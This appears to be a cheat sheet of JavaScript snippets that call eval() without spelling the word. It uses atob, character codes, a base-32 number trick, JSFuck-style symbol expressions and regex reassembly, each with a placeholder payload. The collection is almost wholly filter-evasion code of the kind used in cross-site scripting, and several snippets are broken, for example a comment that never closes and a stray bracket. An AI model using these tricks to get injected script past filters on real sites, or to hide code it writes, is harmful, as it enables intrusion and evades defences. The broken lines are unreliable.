/***********************/
/* Encoded eval string */
/***********************/
<script>
var eval_b64 = 'ZXZhbA==';
var eval_charcode = 'String.fromCharCode(101,118,97,108)';
var eval_base32 = '490837..toString(1<<5)';
var eval_non_alpha1 = '(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]';
var eval_non_alpha2 = '(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]])';
</script>

/*********************/
/* Through functions */
/*********************/
<script>
var fn=window[atob('ZXZhbA==')];
fn(/*code to eval()/*);
</script>

<script>
var fn=window[String.fromCharCode(101,118,97,108)];
fn(/*code to eval()/*);
</script>

<script>
var fn=window[490837..toString(1<<5)];
fn(/*code to eval()/*);
</script>

/**********************************/
/* Straight through window object */
/**********************************/
<script>
window[atob('ZXZhbA==')](/*code to eval()*/)
</script>

<script>
window[String.fromCharCode(101,118,97,108)](/*code to eval()*/)
</script>

<script>
window[490837..toString(1<<5)](/*code to eval()*/)
</script>

<script>
window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](/* code to eval() */)
</script>

<script>
window[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]](/* code to eval() */)
</script>

/*************************/
/* Straight through this */
/*************************/
<script>
this[atob('ZXZhbA==')](/*code to eval()*/)
</script>

<script>
this[String.fromCharCode(101,118,97,108)](/*code to eval()*/)
</script>

<script>
this[490837..toString(1<<5)](/*code to eval()*/)
</script>

<script>
this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](/* code to eval() */)
</script>

<script>
this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]](/* code to eval() */)
</script>

/****************/
/* regexp based */
/****************/
<script>
'e1v2a3l'.replace(/(.).(.).(.).(.)/, function(match,$1,$2,$3,$4) { this[$1+$2+$3+$4](/* code to eval() */); })
</script>

/*********************************/
/* Other ways to execute strings */
/*********************************/
<script>
delete /* code to execute */
throw~delete~typeof~/* code to execute */
delete[a=/* function */]/delete a(/* params */)
var a = (new function(/* code to execute */))();
</script>